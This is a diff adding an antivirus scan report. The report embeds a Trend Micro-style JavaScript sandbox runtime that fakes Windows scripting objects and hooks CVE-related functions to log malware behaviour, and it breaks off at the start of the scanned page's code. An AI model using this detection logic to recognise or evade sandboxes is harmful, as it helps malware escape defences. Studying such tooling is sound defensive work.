@@ -1,0 +1,1869 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<report>
+<file_path>D:\jsdb2\am\files\d3ca20af613891f9be0cc78a36ccc0ffea246065</file_path>
+<file_type>html</file_type>
+<url>http://www.abcd1234sa.com.cn/index</url>
+<decision>Monitoring</decision>
+<matched_rules>
+<rule>JSRansom.DBG.CCON.A</rule>
+</matched_rules>
+<evidence type="javascript">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
+<![CDATA[var SUPPORT_JS_RANSOMWARE_DETECT = true;
+// This is JS Runtime file in SA engine, Copyright @ TrendMicro
+// Author: Michael Du
+// Date: 2016/07/21
+
+///** @const */ var inBrowser = typeof console != "undefined";
+
+if ("undefined" == typeof(hasTMSARuntime)){
+//including guard
+//avoid loading JS Runtime twice in fragment mode
+//otherwise, "new ActivexObject" will be called recursively. The call stack size will exceed the maximum value that lead to detection drop
+hasTMSARuntime = true
+
+// check if current context is browser or SAL
+var inBrowser = (console !== null);
+// prepare jsGlobal variable
+var jsGlobal = (function () {
+    return this || (1, eval)('this');
+})();
+// check environment
+// if it's IE or SAL, noActiveXObject == false
+// if it's Chrome or other non-IE browser, noActiveXObject == true
+var noActiveXObject = ("undefined" == typeof(ActiveXObject));
+
+// print line number and function name into log
+if (!jsGlobal.hasOwnProperty('__stack')) {
+  Object.defineProperty(jsGlobal, '__stack', {
+    get: function(){
+      var orig = Error.prepareStackTrace;
+      Error.prepareStackTrace = function(_, stack){ return stack; };
+      var err = new Error;
+      Error.captureStackTrace(err, arguments.callee);
+      var stack = err.stack;
+      Error.prepareStackTrace = orig;
+      return stack;
+    }
+  });
+}
+if (!jsGlobal.hasOwnProperty('__line')) {
+  Object.defineProperty(jsGlobal, '__line', {
+    get: function(){
+      return __stack[2].getLineNumber();
+    }
+  });
+}
+if (!jsGlobal.hasOwnProperty('__function')) {
+  Object.defineProperty(jsGlobal, '__function', {
+    get: function(){
+      return __stack[2].getMethodName();
+    }
+  });
+}
+
+window.print = function (msg) {
+  if (inBrowser) {
+    console.log(msg, __function, __line);
+  } else {
+    tmsa_log(0, "JS Runtime", msg, __function, __line);
+  }
+};
+
+window.report = function (msg) {
+  if (inBrowser) {
+    console.log(msg, __function, __line);
+  } else {
+    _docode_report(0, "JS Runtime", msg, __function, __line);
+  }
+};
+
+// compatible for old engine which doesn't implement SUPPORT_JS_RANSOMWARE_DETECT
+if (typeof SUPPORT_JS_RANSOMWARE_DETECT == "undefined") {
+  SUPPORT_JS_RANSOMWARE_DETECT = false;
+}
+// print external variables
+print("Support JS ransomware detection: " + SUPPORT_JS_RANSOMWARE_DETECT);
+
+// backup original ActiveXObject
+var oriActiveXObject = undefined;
+if (!noActiveXObject) {
+  print("find ActiveXObject in current context, backup original ActiveXObject");
+  oriActiveXObject = ActiveXObject;
+} else {
+  print("cannot find ActiveXObject in current context");
+}
+
+// Ultra.OfficeControl CVE-2008-3878
+var tmsaUltraOfficeControl = {
+  HttpUpload : function(url, file, postdata) {
+    report("[Ultra.OfficeControl] HttpUpload, url.len: " + url.length + " file.len: " + file.length + " postdata.len: " + postdata.length);
+  }
+}
+
+// hook ActiveXObject
+ActiveXObject = function (name) {
+  if (typeof(name) == "undefined") {
+      throw ("Argument not optional");
+  }
+  report("Create ActiveXObject: "+name);
+  lowerName = name.toLowerCase();
+  if (lowerName.indexOf("kaspersky") >= 0 || lowerName == "") {
+       throw "Can not Create ActiveX for " + name;
+       return undefined;
+  }
+  if (SUPPORT_JS_RANSOMWARE_DETECT && typeof winHostActiveXObject != 'undefined') {
+    var winHostObj = winHostActiveXObject(name);
+    if (typeof winHostObj != 'undefined') {
+      return winHostObj;
+    }
+  }
+  switch (lowerName) {
+    case "ultra.officecontrol": //CVE-2008-3878
+      return tmsaUltraOfficeControl;
+    default:
+      {
+        if (!noActiveXObject) {
+          return new oriActiveXObject(name);
+        } else {
+          throw "Cannot find ActiveXObject: " + name;
+        }
+      }
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/at5ydy31(v=vs.84).aspx
+var WScript = {
+  CreateObject : function(name) {
+    report("[WScript] create object, name = " + name);
+    //lowerName = name.toLowerCase();
+    //if (!noActiveXObject && lowerName == "wscript.shell") {
+    //  return new oriActiveXObject(name);
+    //} else {
+      return ActiveXObject(name);
+    //}
+  }
+};
+
+/*
+//for debug
+//add swfobject.js runtime for Kaixin EK: 0a2f3127f02dca609ca694773089fe689bb3c653
+if (!deconcept) {
+    var deconcept = { 
+        SWFObjectUtil: {
+            getPlayerVersion: function() { 
+              print("[SWF object]get flash player version"); 
+              return {major:12, minor:0, rev:0};
+            }
+        }
+    }
+}
+*/
+
+//add IE runtime for Magnitude EK: 3dea414094ad055fcfc016d465af84ac719e1c7a
+// Chaoying: CVE-2013-2551
+document.namespaces = { 
+    add: function (_name, _urn, _url) {
+        report("[document.namespaces.add] URN:"+_urn+", URL:"+_url+", Name:"+_name);
+    }
+};
+
+//Chaoying_Liu, add IE runtime for CVE-2015-2419: 59a748fe5097051f47bcce9ef67a65f65b9fcfbd
+function ScriptEngineBuildVersion() {
+    report("call TMSA ScriptEngineBuildVersion()");
+    return 17905;
+}
+
+function ScriptEngineMajorVersion() {
+    report("call TMSA ScriptEngineMajorVersion()");
+    return 11;
+}
+function ScriptEngineMinorVersion() {
+    report("call TMSA ScriptEngineMinorVersion()");
+    return 3;
+}
+
+//Chaoying_Liu
+//hook execute of VBScript for CVE-2014-6332, 73e3326f389c34256d717bb88a45f0742c1195bd
+function execute(string) {
+    report("[execute of VBScript], param:" + string)
+    return ;
+}
+
+//Chaoying_Liu
+//hook strreverse of VBScript for CVE-2014-6332, e53585e95f151f9e8f4f522c156510d6ab414e07
+function StrReverse(string) {
+    result = string.split("").reverse().join("")
+    report("[StrReverse of VBScript], return:" + result)
+    return result;
+}  
+function strreverse(string) { 
+    return StrReverse(string); 
+}
+
+//Nico_Jiang
+//hook execScript for vbScript for CVE-2016-0189,sha1 = "292DEA1C7DA35677734F2B426A552BB0FBE8225F"
+function execScript(code,Language)
+{
+    report("[execScript of VBScript], param:" + code)
+}  
+
+}//end of including guard]]>
+</content>
+</evidence>
+<evidence type="javascript_behavior">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<content mode="text">
+<![CDATA[]]>
+</content>
+</evidence>
+<evidence type="javascript">
+<external_variables>
+<ev name="obfuscation">0</ev>
+</external_variables>
+<attributes>
+<attr name="url">http://www.abcd1234sa.com.cn/index</attr>
+</attributes>
+<content mode="text">
+<![CDATA[// This is JS Runtime file for Windows Host in SA engine, Copyright @ TrendMicro
+// Author: Michael Du
+// Date: 2016/10/27
+
+if ("undefined" == typeof(hasTMSAWinHostRuntime)){
+//including guard
+//avoid loading JS Runtime twice in fragment mode
+//otherwise, "new ActivexObject" will be called recursively. The call stack size will exceed the maximum value that lead to detection drop
+hasTMSAWinHostRuntime = true
+
+// Following variables and functions have been defined in global runtime.js, such as:
+// noActiveXObject and oriActiveXObject
+
+// In SAL, core engine has implements some objects, such as:
+// WScript.Shell, Scripting.FileSystemObject and MSXML2.ServerXMLHTTP, etc.
+// When script triggers this object, runtime should call core engine implements.
+var oriWScriptShell = undefined;
+var oriFileSystem = undefined;
+var oriServerXMLHTTP = undefined;
+if (!noActiveXObject) {
+  print("find ActiveXObject in current context, backup original WScript.Shell, Scripting.FileSystemObject and MSXML2.ServerXMLHTTP");
+  oriWScriptShell = new oriActiveXObject("WScript.Shell");
+  oriFileSystem = new oriActiveXObject("Scripting.FileSystemObject");
+  oriServerXMLHTTP = new oriActiveXObject("MSXML2.ServerXMLHTTP");
+} else {
+  print("cannot find ActiveXObject in current context");
+}
+
+
+// https://msdn.microsoft.com/en-us/library/efy5bay1(v=vs.94).aspx
+if (typeof ScriptEngine == "undefined") {
+  window.ScriptEngine = function() {
+    report("[Window Global] Call ScriptEngine()");
+    return "JScript.Encode";
+  }
+}
+
+// https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Date/getYear
+Date.prototype.getYear = function() {
+  return this.getFullYear();
+}
+
+Date.prototype.getUTCMilliseconds = function() {
+  return Math.floor((Math.random() * 1000));
+}
+
+// https://msdn.microsoft.com/en-us/library/aa242724(v=vs.60).aspx
+function TmsaTextStream(name) {
+  this.name_ = name;
+  this.content_ = "";
+  this.Line = "";
+  this.atendofstream = true;
+}
+
+TmsaTextStream.prototype = {
+  get Column(){
+    // https://msdn.microsoft.com/en-us/library/ddz9scc8(v=vs.84).aspx
+    // Column must large than 0
+    report("[Text.Stream] get Column property");
+    return 1;
+  }
+}
+
+TmsaTextStream.prototype.WriteLine = function(line) {
+  report("[Text.Stream] write line, value = " + line);
+  this.content_ += line;
+}
+TmsaTextStream.prototype.WRITELine = function(line) {
+  this.WriteLine(line)
+}
+TmsaTextStream.prototype.Write = function(content) {
+  report("[Text.Stream] write, value = " + content);
+  this.content_ = content;
+}
+TmsaTextStream.prototype.write = function(content) {
+  this.Write(content)
+}
+TmsaTextStream.prototype.Close = function() {
+  report("[Text.Stream] close");
+}
+TmsaTextStream.prototype.close = function() {
+  this.Close();
+}
+// TmsaTextStream.prototype.read = function() {
+//   report("[Text.Stream] read, content = " + this.content_);
+//   return this.content_;
+// }
+TmsaTextStream.prototype.ReadAll = function() {
+  report("[Text.Stream] ReadAll, content = " + this.content_);
+  return this.content_;
+}
+TmsaTextStream.prototype.ReadLine = function() {
+  report("[Text.Stream] ReadLine, content = " + this.content_);
+  return this.content_;
+}
+TmsaTextStream.prototype.GetName = function() {
+  report("[Text.Stream] GetName, name = " + this.name_);
+  return this.name_;
+}
+
+function TMSAString(data) {
+  this.dumpReadCharCode = false;
+  this.data = data;
+  if (data.length != 0) {
+    this.length = this.data.length;
+  } else {
+    this.length = 10000;
+  }
+  this.countCharCodeAt = 0;
+}
+TMSAString.prototype.valueOf = function() {
+  return this.data;
+}
+TMSAString.prototype.toString = function() {
+  return this.data;
+}
+TMSAString.prototype.charCodeAt = function(index) {
+  if (this.length == 10000 && this.dumpReadCharCode == false) {
+    if (this.countCharCodeAt++ > 10) {
+      this.dumpReadCharCode = true;
+      var msg = "stop accessing fake response body in loop";
+      report(msg);
+      throw msg;
+    } else {
+      report("[TMSAString] call charCodeAt, return fake value (A), index = " + index);
+    }
+    return 'A';
+  }
+  return this.data[index];
+}
+TMSAString.prototype.fromCharCode = function(num) {
+  return String.fromCharCode(num);
+}
+TMSAString.prototype.substr = function(a,b) {  //absinthe
+  return this.data.substr(a,b);  //absinthe
+}  //absinthe
+
+// https://msdn.microsoft.com/en-us/library/1ft05taf(v=vs.84).aspx
+function TmsaFile(path) {
+  this.path = path;
+  this.shortpath = path;
+}
+TmsaFile.prototype = {
+  // properties
+  get Path(){
+    report("[File] get Path property");
+    return this.path;
+  }, 
+  // methods
+  OpenAsTextStream: function(iomode, format) {
+    report("[File] OpenAsTextStream");
+    return new TmsaTextStream(this.path);
+  },
+  openastextstream: function(iomode, format) {
+    return this.OpenAsTextStream(iomode, format)
+  }
+}
+
+// https://msdn.microsoft.com/en-us/library/1c87day3(v=vs.84).aspx
+function TmsaFolder(path) {
+  this.path = path;
+}
+TmsaFolder.prototype = {
+  // properties
+  get Path(){
+    report("[Folder] get Path property");
+    return this.path;
+  }, 
+  // methods
+  CopyHere: function(items, option) {
+    report("[Folder] call CopyHere");
+  }, 
+  Items: function() {
+    report("[Folder] call Items");
+    return "";
+  },
+  CreateTextFile: function(filename, overwrite, unicode) {
+    report("[Folder] CreateTextFile, filename = " + filename);
+    return new TmsaTextStream(filename);
+  },
+}
+
+// 
+var tmsaNewAddedFiles = {
+  filelist: [],
+  add: function(filename) {
+    this.filelist.push(filename);
+  },
+  remove: function(filename) {
+    for (index in this.filelist) {
+      if (this.filelist[index].GetName().indexOf(filename) != -1) {
+        this.filelist.splice(index,1);
+      }
+    }
+  },
+  find: function(filename) {
+    for (index in this.filelist) {
+      if (this.filelist[index].GetName().indexOf(filename) != -1) {
+        return this.filelist[index];
+      }
+    }
+    return undefined;
+  },
+};
+
+// --------------- for wscript -----------------------
+// NOTE:
+// In tmsa.dll, it has hooked ExpandEnvironmentStrings and run in WScript.Shell
+// So we need to hook WScript.Shell in JS-Runtime, NOT to reimplement it.
+//
+// https://msdn.microsoft.com/en-us/library/98591fh7(v=vs.84).aspx
+var WshSysEnv = function(name) {
+  var ret_val = undefined;
+  switch (name.toUpperCase()) {
+    case 'COMSPEC':
+      ret_val = '%SystemRoot%\\system32\\cmd.exe';
+      break;
+    case 'PROCESSOR_ARCHITECTURE':
+      ret_val = 'x86';
+      break;
+    default:  //absinthe
+      ret_val = name.toUpperCase();  //absinthe
+      break;  //absinthe
+  }
+  return ret_val;
+}
+
+function TmsaWshShortcut(path) {
+    this.place = path;
+    this.TargetPath = '';
+    this.WindowStyle = 1;
+    this.FullName = path;
+}
+
+var tmsaScriptShell = {
+  run : function() {
+    report("[WScript.Shell] Run!");
+    if (undefined != oriWScriptShell) {
+      oriWScriptShell.run();
+    }
+  },
+  run : function(cmd, style, wait_on_return) {
+    report("[WScript.Shell] Run! CMD: " + cmd + ", Window Style: " + style + ", Wait on return: " + wait_on_return);
+    if (undefined != oriWScriptShell) {
+      oriWScriptShell.run(cmd, style, wait_on_return);
+    }
+    if (-1 != cmd.indexOf(".js") && !inBrowser) {
+      file = tmsaNewAddedFiles.find(cmd);
+      jsGlobal.eval(file.ReadAll());
+    }
+  },
+  Run : function(cmd, style, wait_on_return) {
+    this.run(cmd, style, wait_on_return);
+  },
+  ExpandEnvironmentStrings : function(path) {
+    report("[WScript.Shell] ExpandEnvironmentStrings, path = " + path);
+    if (undefined != oriWScriptShell) {
+      return oriWScriptShell.ExpandEnvironmentStrings(path);
+    } else {
+      return path;
+    }
+  },
+  expandEnvironmentStrings : function(path) {
+    return this.ExpandEnvironmentStrings(path);
+  },
+  expandenvironmentstrings : function(path) {  //absinthe
+    return this.ExpandEnvironmentStrings(path); //absinthe
+  },  //absinthe
+  // https://msdn.microsoft.com/en-us/library/0ea7b5xe(v=vs.84).aspx
+  SpecialFolders: function(objWshSpecialFolders) {
+    var ret_val = '';
+    switch (objWshSpecialFolders.toLowerCase()) {
+      case "desktop":
+      {
+        ret_val = 'c:\\users\\admin\\desktop\\';
+        break;
+      }
+      default:
+        break;
+    }
+    return ret_val;
+  },
+  // https://msdn.microsoft.com/en-us/library/fd7hxfdd(v=vs.84).aspx
+  Environment: function(type) {
+    var ret_val = undefined;
+    switch (type.toUpperCase()) {
+      case 'SYSTEM':
+        ret_val = WshSysEnv;
+        break;
+      case 'PROCESS':
+        ret_val = WshSysEnv;
+        break;
+      default:  //absinthe
+        ret_val = WshSysEnv;  //absinthe
+        break;  //absinthe
+    }
+    return ret_val;
+  },
+  // https://msdn.microsoft.com/en-us/library/x05fawxd(v=vs.84).aspx
+  RegRead: function(key) {
+    report("[WScript.Shell] RegRead, key = " + key);
+    if (-1 != key.indexOf('ProgramFilesDir')) {
+      return 'C:\\Program Files (x86)';
+    } else {
+      return '';
+    }
+  }, 
+  // https://msdn.microsoft.com/en-us/library/ateytk4a(v=vs.84).aspx
+  Exec: function(command) {
+    report("[WScript.Shell] Exec! CMD: " + command);
+  },
+  exec: function(command) {
+    this.Exec(command);
+  },
+  // https://msdn.microsoft.com/en-us/library/xsy6k3ys(v=vs.84).aspx
+  CreateShortcut: function(path) {
+    report("[WScript.Shell] CreateShortcut, path = " + path);
+    return new TmsaWshShortcut(path);
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/windows/desktop/bb774094(v=vs.85).aspx
+var tmsaShellApp = {
+  NameSpace: function(dir) {
+    report("[Shell.Application] call NameSpace, dir = " + dir);
+    return new TmsaFolder(dir);
+  },
+  ShellExecute: function(file, args, dir, operation, show) {
+    args = args.replace('^', '');
+    report("[Shell.Application] ShellExecute, file = " + file + ", args = " + args + ", dir = " + dir + ", operation = " + operation + ", show = " + show);
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/ms535874(v=vs.85).aspx
+var tmsaXMLHttp = {
+  // workaround for event callback
+  onreadystatechange_callback: undefined,
+  trigger_callback : function() {
+    if (undefined != this.onreadystatechange_callback) {
+      report("[XMLHttpRequest] trigger onreadystatechange callback.");
+      this.onreadystatechange_callback();
+    }
+  },
+  // public functions
+  open : function(method, url, async, username, password) {
+    report("[XMLHttpRequest] open HTTP request, method = " + method + ", URL = " + url);
+  },
+  opEn : function(method, url, async, username, password) {
+    this.open(method, url, async, username, password);
+  },
+  send : function() {
+    report("[XMLHttpRequest] send HTTP request");
+    this.trigger_callback();
+  },
+  // https://msdn.microsoft.com/en-us/library/ms536752(v=vs.85).aspx
+  setRequestHeader : function(header, value) {
+    report("[XMLHttpRequest] set request header, header = " + header + ", value = " + value);
+  },
+  SetRequestHeader : function(header, value) {
+    this.setRequestHeader(header, value);
+  },
+  // properties
+  get status() {
+    report("[XMLHttpRequest] get HTTP status, return 200");
+    return 200;
+  },
+  get Status() {
+    return this.status;
+  },
+  get responseBody() {
+    report("[XMLHttpRequest] get HTTP Response Body");
+    return new TMSAString("fake_response_body_content");
+  },
+  get ResponseBody() {
+    return this.responseBody;
+  },
+  set onreadystatechange(callback) {
+    report("[XMLHttpRequest] set callback of onreadystatechange");
+    this.onreadystatechange_callback = callback;
+  },
+  get readyState() {
+    return 4;
+  },
+  get readystate() {  //absinthe
+    return this.readyState;  //absinthe
+  },    //absinthe
+  get ReadyState() {
+    return this.readyState;
+  },
+  get responseText(){  //absinthe
+    return this.responseBody //absinthe
+  }, //absinthe
+};
+
+// https://msdn.microsoft.com/en-us/library/windows/desktop/aa384106(v=vs.85).aspx
+var tmsaWinHttp = tmsaXMLHttp;
+
+// https://msdn.microsoft.com/en-us/library/ms766431(v=vs.85).aspx
+var tmsaServerXMLHTTP = {
+  open : function(method, url, async, username, password) {
+    report("[ServerXMLHTTP] open HTTP request, method = " + method + ", URL = " + url);
+    if (!noActiveXObject) {
+      oriServerXMLHTTP.open(method, url, async, username, password);
+    }
+  },
+  send : function() {
+    report("[ServerXMLHTTP] send HTTP request");
+    if (!noActiveXObject) {
+      oriServerXMLHTTP.send();
+    }
+  }, 
+  get status() {
+    report("[ServerXMLHTTP] get HTTP status, return 200");
+    return 200;
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/ms675032(v=vs.85).aspx
+var tmsaADODB = {
+  filename: "",
+  open : function() {
+    report("[ADODB.Stream] open stream");
+  },
+  Open: function() {
+    this.open();
+  },
+  write : function(args) {
+    report("[ADODB.Stream] write content, " + args);
+  },
+  Write: function(args) {
+    this.write(args);
+  },
+  WriteText: function(args) {  //absinthe
+    this.write(args);  //absinthe
+  },  //absinthe
+  get size() {
+    report("[ADODB.Stream] get content size, fake size = 2000");
+    return 900000;
+  },
+  saveToFile : function(file_name, save_options) {
+    this.SaveToFile(file_name, save_options);
+  },
+  savetofile : function(file_name, save_options) {  //absinthe
+    this.SaveToFile(file_name, save_options);   //absinthe
+  },   //absinthe
+  SaveToFile : function(file_name, save_options) {
+    report("[ADODB.Stream] save to file, path = " + file_name);
+    tmsaNewAddedFiles.add(new TmsaTextStream(file_name));
+  },
+  close : function() {
+    report("[ADODB.Stream] close stream");
+  }, 
+  Close: function() {
+    this.close();
+  },
+  set type(val) {
+    report("[ADODB.Stream] set type, value = " + val);
+  },
+  set position(val) {
+    report("[ADODB.Stream] set position, value = " + val);
+  }, 
+  LoadFromFile: function(filename) {
+    report("[ADODB.Stream] Load contents of existing file, filename: " + filename);
+    this.filename = filename;
+  },
+  loadFromFile: function(filename) {
+    this.LoadFromFileFileName(filename);
+  },
+  //ReadText: function(numchars) {
+  //  return "fake_response_body_content";
+  //},
+  //readText: function(numchars) {
+  //  return this.ReadText(numchars);
+  //},
+  get ReadText() {
+    var file = tmsaNewAddedFiles.find(this.filename);
+    return new TMSAString(file.ReadAll());
+  },
+};
+
+// https://msdn.microsoft.com/en-us/library/6tkce7xa(v=vs.84).aspx
+var tmsaFileSystem = {
+  // Adds a new folder to a Folders collection.
+  Add: function(foldername) {
+    report("[FileSystemObject] Add folder, " + foldername);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.Add(foldername);
+    }
+  },
+  BuildPath: function(path, name) {  //absinthe
+    return path + name;  //absinthe
+  },  //absinthe
+  FolderExists: function(folderspec) {
+    report("[FileSystemObject] Folder exists, " + folderspec)
+    return true;
+  },
+  CreateFolder: function(foldername) {
+    report("[FileSystemObject] Create folder, " + foldername);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.CreateFolder(foldername);
+    }
+  },
+  FileExists: function(filespec) {
+    report("[FileSystemObject] File exists: " + filespec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.FileExists(filespec);
+    }
+    if (-1 != filespec.indexOf('\\system.ini')) {
+      return true;
+    } else {
+      return undefined != tmsaNewAddedFiles.find(filespec);
+    }
+  },
+  CreateTextFile: function(filename, overwrite, unicode) {
+    report("[FileSystemObject] Create text file, filename: " + filename);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.CreateTextFile(filename, overwrite, unicode);
+    }
+    var text = new TmsaTextStream(filename);
+    tmsaNewAddedFiles.add(text);
+    return text;
+  },
+  createtextfile: function(filename, overwrite, unicode) {
+    return this.CreateTextFile(filename, overwrite, unicode);
+  },
+  OpenTextFile: function(filename, iomode, create, format) {
+    report("[FileSystemObject] Open text file, filename: " + filename);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.OpenTextFile(filename, iomode, create, format);
+    }
+    var text = new TmsaTextStream(filename);
+    if (-1 != filename.indexOf('\\system.ini')) {
+      text.Write('; for 16-bit app support');
+    }
+    tmsaNewAddedFiles.add(text);
+    return text;
+  },
+  OPENTextFile: function(filename, iomode, create, format) {
+    return this.OpenTextFile(filename, iomode, create, format);
+  },
+  GetSpecialFolder: function(folderspec) {
+    report("[FileSystemObject] Return special folder object specified: " + folderspec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.GetSpecialFolder(folderspec);
+    }
+    var specfolder = "";
+    switch (folderspec) {
+      case 0:
+        specfolder = "C:\\Windows";
+        break;
+      case 1:
+        specfolder = "C:\\Windows\\System32";
+        break;
+      case 2:
+        specfolder = "%TEMP%";
+        break;
+    }
+    return specfolder;
+  },
+  getspecialfolder: function(folderspec) {  //absinthe
+    return this.GetSpecialFolder(folderspec);  //absinthe
+  },   //absinthe
+  GetParentFolderName: function(path) {
+    report("[FileSystemObject] Return parent folder name for: " + path);
+    var path_arr = path.split('\\');
+    path_arr.pop();
+    return path_arr.join('\\');
+  },
+  GetTempName: function() {
+    report("[FileSystemObject] Returns a randomly generated temporary file or folder name");
+    if (oriFileSystem != undefined) {
+      oriFileSystem.GetTempName();
+    }
+    return "random_temp_filename";
+  },
+  GetFolder: function(folderspec) {
+    report("[FileSystemObject] GetFolder, folderspec = " + folderspec);
+    return new TmsaFolder(folderspec);
+  },
+  getFolder: function(folderspec) {
+    return this.GetFolder(folderspec);
+  },
+  GetFile: function(filespec) {
+    report("[FileSystemObject] GetFile, filespec = " + filespec);
+    return new TmsaFile(filespec);
+  },
+  getFile: function(filespec) {
+    return this.GetFile(filespec);
+  },
+  getfile: function(filespec) {  //absinthe
+    return this.GetFile(filespec);  //absinthe
+  },  //absinthe
+  DeleteFile: function(filespec, force) {
+    report("[FileSystemObject] Deletes a specified file, " + filespec);
+    if (oriFileSystem != undefined) {
+      oriFileSystem.DeleteFile(filespec, force);
+    }
+    tmsaNewAddedFiles.remove(new TmsaTextStream(filespec));
+  },
+  deleteFile: function(filespec, force) {
+    this.DeleteFile(filespec, force);
+  },
+  CopyFile: function(filespec,destfile) {
+    report("[FileSystemObject] CopyFile from " + filespec + " to " + destfile);
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/x4k5wbx4(v=vs.84).aspx
+var tmsaDictionaryObject = {
+  items: {},
+  add: function(key, item) {
+    this.items[key] = item;
+  },
+  Add: function(key, item) {
+    this.items[key] = item;
+  },
+  Item: function(key) {
+    return this.items[key];
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/yab2dx62(v=vs.84).aspx
+// http://stackoverflow.com/questions/19234417/jscript-vbscript-typename-function-for-activexobjects
+var tmsaVBScriptRegExp = {
+
+}
+
+// https://msdn.microsoft.com/en-us/library/s6wt333f(v=vs.84).aspx
+var tmsaWScriptNetwork = {
+  get ComputerName() {
+    return "FakeComputerName";
+  },
+  get computerName() {
+    return this.ComputerName;
+  },
+  get UserDomain() {
+    return "FakeSA";
+  },
+  get UserName() {
+    return "AdminTest";
+  },
+  EnumPrinterConnections: function() {
+    var FEPC=new Object();
+    FEPC.Item=function(number){
+      return "FakeEnumPrinterConnections_"+number;
+    };
+    FEPC.Count=function(){
+      return 0;
+    };
+    return FEPC;
+  },
+  EnumNetworkDrives: function() {
+    var FEND=new Object();
+    FEND.Item=function(number){
+      return "FakeEnumNetworkDrives_"+number;
+    };
+    FEND.Count=function(){
+      return 0;
+    };
+    return FEND;
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/d6y04sbb(v=vs.84).aspx
+var tmsaWshNamed = {
+  get Length() {
+    return 0;
+  },
+  get length() {
+    return this.Length;
+  },
+}
+
+// https://msdn.microsoft.com/en-us/library/ss1ysb2a(v=vs.84).aspx
+var tmsaWshArguments = {
+  get Length() {
+    return 0;
+  },
+  get length() {
+    return this.Length;
+  },
+  get Named() {
+    return tmsaWshNamed;
+  },   
+  get Unnamed() {    //absinthe
+    return tmsaWshNamed;    //absinthe
+  }   //absinthe
+}
+
+
+
+// this ActiveXObject function will be triggered in runtime.js:ActiveXObject
+// so name is not undefined
+winHostActiveXObject = function (name) {
+  report("Create ActiveXObject: "+name);
+  lowerName = name.toLowerCase();
+  switch (lowerName) {
+    case "wscript.shell":
+      report("[ActiveXObject] create WScript.Shell");
+      return tmsaScriptShell;
+    case "shell.application":
+      report("[ActiveXObject] create Shell.Application");
+      return tmsaShellApp;
+    case "adodb.stream":
+      report("[ActiveXObject] create ADODB.Stream");
+      return tmsaADODB;
+    case "scripting.filesystemobject":
+      return tmsaFileSystem;
+    case "scripting.dictionary":
+      return tmsaDictionaryObject;
+    case "vbscript.regexp":
+      return tmsaVBScriptRegExp;
+    case "wscript.network":
+      return tmsaWScriptNetwork;
+    default:
+      if (-1 != lowerName.indexOf("msxml2.xmlhttp")) {
+        report("[ActiveXObject] create MSXML2.XMLHTTP");
+        return tmsaXMLHttp;
+      } else if (-1 != lowerName.indexOf("microsoft.xmlhttp")) {  //absinthe
+        report("[ActiveXObject] create microsoft.xmlhttp");  //absinthe
+        return tmsaWinHttp;  //absinthe
+      } else if (-1 != lowerName.indexOf("winhttp.winhttprequest")) {
+        report("[ActiveXObject] create WinHttp.WinHttpRequest");
+        return tmsaWinHttp;
+      } else if (-1 != lowerName.indexOf("msxml2.serverxmlhttp")) {
+        report("[ActiveXObject] create MSXML2.ServerXMLHTTP");
+        return tmsaServerXMLHTTP;
+      } else {
+        return undefined;
+      }
+  }
+};
+
+// https://msdn.microsoft.com/en-us/library/at5ydy31(v=vs.84).aspx
+sleep_count = 0;
+WScript.Sleep = function(milliseconds) {
+  report("[WScript] sleep, milliseconds = " + milliseconds);
+  if (sleep_count > 10) {
+    report("[WScript] Sleep count > 10");
+    throw "Sleep count > 10";
+  }
+  sleep_count++;
+};
+WScript.sleep = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.sLeEP = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.SleEp = function(milliseconds) {
+  this.Sleep(milliseconds);
+};
+WScript.Quit = function(errorcode) {
+  report("[WScript] quit! errorcode = " + errorcode);
+};
+WScript.quit = function(errorcode) {  //absinthe
+  this.Quit(errorcode);  //absinthe
+};  //absinthe
+WScript.toString = function() {
+  return "Windows Script Host";
+};
+WScript.Echo = function(args) {
+  report("[WScript.Echo] " + args);
+};
+WScript.echo = function(args) {
+  this.Echo(args);
+};
+WSH = WScript;
+wscript = WScript  //absinthe
+if (!WScript.hasOwnProperty('Version')) {
+  Object.defineProperty(WScript, 'Version', {
+    get: function() {
+      // make sure length of version is greater than 0
+      return "5.8.9600.17415";
+    }
+  });
+}
+if (!WScript.hasOwnProperty('ScriptFullName')) {
+  Object.defineProperty(WScript, 'ScriptFullName', {
+    get: function() {
+      return "fake_full_path_of_running_script_name";
+    }
+  });
+}
+if (!WScript.hasOwnProperty('Arguments')) {
+  Object.defineProperty(WScript, 'Arguments', {
+    get: function() {
+      return tmsaWshArguments;
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdErr')) {
+  Object.defineProperty(WScript, 'StdErr', {
+    get: function() {
+      report("[WScript] get StdErr property");
+      return new TmsaTextStream("StdErr");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdIn')) {
+  Object.defineProperty(WScript, 'StdIn', {
+    get: function() {
+      report("[WScript] get StdIn property");
+      return new TmsaTextStream("StdIn");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('StdOut')) {
+  Object.defineProperty(WScript, 'StdOut', {
+    get: function() {
+      report("[WScript] get StdOut property");
+      return new TmsaTextStream("StdOut");
+    }
+  });
+}
+if (!WScript.hasOwnProperty('Path')) {
+  Object.defineProperty(WScript, 'Path', {
+    get: function() {
+      report("[WScript] get Path property");
+      return "C:\\Windows\\System32";
+    }
+  });
+}
+
+} // end of including guard
+
+
+
+
+
+function left(str, lngLen) {
+    if (lngLen > 0) {
+        return str.substring(0, lngLen)
+    } else {
+        return null
+    }
+}
+function right(str, lngLen) {
+    if (str.length - lngLen >= 0 && str.length >= 0 && str.length - lngLen <= str.length) {
